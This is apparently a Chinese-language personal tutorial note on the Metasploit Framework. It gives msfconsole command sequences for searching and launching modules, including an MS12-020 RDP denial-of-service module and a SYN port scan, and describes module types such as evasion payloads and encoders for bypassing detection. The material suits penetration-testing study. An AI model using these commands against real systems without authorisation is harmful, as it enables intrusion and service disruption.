
Metasploit Framework（利用框架）：kali自带的跨平台的程序框架，由perl到ruby语言编写而成。
^
目的：一般使用主机扫描器发现漏洞后(非必要)，使用msf的auxiliary模块漏洞验证，以及漏洞利用获取meterpreter（msf在目标机的交互式shell）。

操作：<https://www.cnblogs.com/Hekeats-L/p/16756351.html>
全流程：<https://blog.csdn.net/dzqxwzoe/article/details/139338682>
使用nps将本地内网中MFS变公网。


## **基本流程**
```
1、开启MSF工具:msfconsole  ，查看模块:show xx

2、查询漏洞利用工具:search 漏洞编号  如:search ms12_020
3、打开进入工具: use 工具id     
如 进入辅助模块的工具:use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
退回工具:back

4、查看工具配置参数:show options
5、查看工具的详细信息:info

6、配置参数:
set 参数头 目标主机        如:set RHOST 192.168.253.20   
set 参数头 目标端口
(参数配置根据实际所缺参数为准)

7、运行工具:run或者exploit 或exploit -j
查看后台工作jobs
jobs -v命令查看
jobs -h
jobs -i 0

返回命令:back
新版kali已经自动配置Payload;不需要再次自己配置(当然也可以自己配置:set payload windows/\*\*\*/…/…),这里推荐使用反向连接，不会被防火墙阻隔。
```

使用syn扫描器
```
msfconsole  
search portscan
use auxiliary/scanner/portscan/syn
show options
set rhosts 192.0.0.1
run
```

^
## **modules模块**
msf模块都放在/usr/share/metasploit-framework/modules目录下
msf检查并更新 Metasploit 的模块：
```
msf6 > update
```

1、auxiliary(常规漏洞验证)
辅助模块，辅助渗透（端口扫描、登录密码爆破、漏洞验证等）

2、encoders
编码器模块，主要包含各种编码工具，对payload进行编码加密，以便绕过入侵检测和过滤系统

3、evasion
规避模块，用来生成免杀payload

4、exploits(谨慎使用)
漏洞利用模块，包含主流的漏洞利用脚本，通常是对某些可能存在漏洞的目标进行漏洞利用

5、nops
这里主要放着调整shellcode前置nop指令长度的工具

6、payloads
攻击载荷，主要是攻击成功后在目标机器执行的代码，比如反弹shell的代码，后门，木马等

7、post
后渗透模块，漏洞利用成功获得meterperter之后，向目标发送的一些功能性指令，如：提权等



^
## **msfvenom**
msfvenom取代了msf中payloads和encoders模块


